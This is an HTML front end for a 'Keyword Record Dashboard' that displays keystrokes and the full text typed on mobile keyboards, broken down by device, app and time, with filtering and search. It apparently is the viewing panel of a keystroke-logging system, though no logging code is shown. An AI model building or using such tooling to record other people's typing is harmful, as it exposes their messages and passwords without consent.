<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Keyword Record Dashboard</title>
  <link rel="stylesheet" href="/styles.css" />
</head>
<body>
  <div class="app">
    <header>
      <div>
        <h1>Keyword Record Dashboard</h1>
        <p>View everything typed from your mobile keyboard</p>
      </div>
      <div class="header-actions">
        <button id="clearAllBtn" class="btn danger">Clear All Data</button>
        <button id="refreshBtn" class="btn primary">Refresh</button>
      </div>
    </header>

    <section class="stats">
      <div class="stat-card">
        <span class="label">Total Records</span>
        <strong id="totalRecords">0</strong>
      </div>
      <div class="stat-card">
        <span class="label">Devices</span>
        <strong id="totalDevices">0</strong>
      </div>
      <div class="stat-card">
        <span class="label">Last Updated</span>
        <strong id="lastUpdated">—</strong>
      </div>
    </section>

    <section class="filters">
      <label>
        Device
        <select id="deviceFilter">
          <option value="">All devices</option>
        </select>
      </label>
      <label>
        Search text
        <input id="searchInput" type="search" placeholder="Search key or full text..." />
      </label>
      <label>
        Limit
        <select id="limitFilter">
          <option value="50">50</option>
          <option value="100" selected>100</option>
          <option value="250">250</option>
          <option value="500">500</option>
        </select>
      </label>
    </section>

    <section class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>Record ID</th>
            <th>Device ID</th>
            <th>Key</th>
            <th>Full Text</th>
            <th>App</th>
            <th>Action</th>
            <th>Time</th>
            <th></th>
          </tr>
        </thead>
        <tbody id="recordsBody">
          <tr><td colspan="8" class="empty">Loading records...</td></tr>
        </tbody>
      </table>
    </section>
  </div>

  <script src="/app.js"></script>
</body>
</html>
